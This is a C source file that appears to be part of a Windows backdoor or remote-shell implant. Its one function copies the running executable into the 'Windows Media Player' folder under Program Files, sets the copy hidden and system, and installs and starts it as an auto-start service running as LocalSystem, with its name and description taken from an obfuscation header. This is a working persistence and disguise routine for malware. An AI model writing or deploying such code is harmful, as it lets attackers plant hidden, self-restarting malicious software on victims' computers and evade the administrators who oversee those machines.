#include <windows.h>
#include <stdio.h>

#include "main.h"
#include "shell_obf.h"

int shell_service_create() {
	
	// vars
	char MainDirPath[MAX_PATH] = {0};
	char ExePath[MAX_PATH] = {0};
	strcat(MainDirPath, getenv(SHELL_STRING_GETENV_PROGRAMFILES));
	strcat(MainDirPath, "\\Windows Media Player");
	strcat(ExePath, MainDirPath);
	strcat(ExePath, "\\" SHELL_SERVICE_NAME ".exe");
	// var exe path
	char selfbuff[MAX_PATH] = {0};
    GetModuleFileName(NULL, selfbuff, MAX_PATH);
	
	// copy own exe
	CopyFile(selfbuff, ExePath, FALSE);
	
	// hide self
	SetFileAttributes(ExePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	
	// create and start service
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); // get SCM database handle
	if (schSCManager == NULL) { DPL("OpenSCManager failed"); return 0; }
	
	// Create the service
	SC_HANDLE schService = CreateService( 
		schSCManager,                                            // SCM database 
		SHELL_SERVICE_NAME,                                      // name of service 
		SHELL_SERVICE_DISPLAYNAME,                               // service name to display 
		SERVICE_ALL_ACCESS,                                      // desired access 
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, // service type 
		SERVICE_AUTO_START,                                      // start type 
		SERVICE_ERROR_NORMAL,                                    // error control type 
		ExePath,                                                 // path to service's binary 
		NULL,                                                    // no load ordering group 
		NULL,                                                    // no tag identifier 
		NULL,                                                    // no dependencies 
		NULL,                                                    // LocalSystem account 
		NULL                                                     // no password 
	);
	
	if (schService == NULL) { D(printf("CreateService failed: %ld\n", GetLastError())); CloseServiceHandle(schSCManager); return 0; }
	DPL("service installed");
	
	// set description
	SERVICE_DESCRIPTIONA desc;
	desc.lpDescription = SHELL_SERVICE_DESCRIPTION;
	if (!ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &desc)) { D(printf("ChangeServiceConfig2 failed: %ld\n", GetLastError())); }
	else { DPL("description set"); }
	
	if (!StartService(schService, 0, NULL)) { D(printf("StartService failed: %ld\n", GetLastError())); return 0; }
	DPL("service started");
	
	CloseServiceHandle(schService); 
	CloseServiceHandle(schSCManager);
	
	return 1;
}